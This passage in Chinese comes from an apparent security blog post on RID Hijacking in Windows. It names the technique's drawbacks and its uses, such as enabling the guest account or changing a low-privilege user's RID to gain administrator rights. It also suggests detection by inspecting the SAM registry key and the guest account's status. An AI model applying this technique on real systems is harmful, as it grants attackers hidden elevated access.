用户名的显示存在问题，容易被发现 模拟ADMINISTRATOR的权限会新建用户文件夹 利用场景 启用帐户guest，修改RID,登录帐户guest，获得高权限 修改低权限用户RID，登录获得高权限 0x06 防御检测 站在防御的角度，攻击者首先需要获得当前系统的system权限 检测思路： 查看注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\下的信息是否存在异常 帐户guest是否被开启 0x07 小结 本文介绍了RID Hijacking的实现方法，分析利用条件，给出防御建议 LEAVE A REPLY]]></content>
  </entry>
</search>
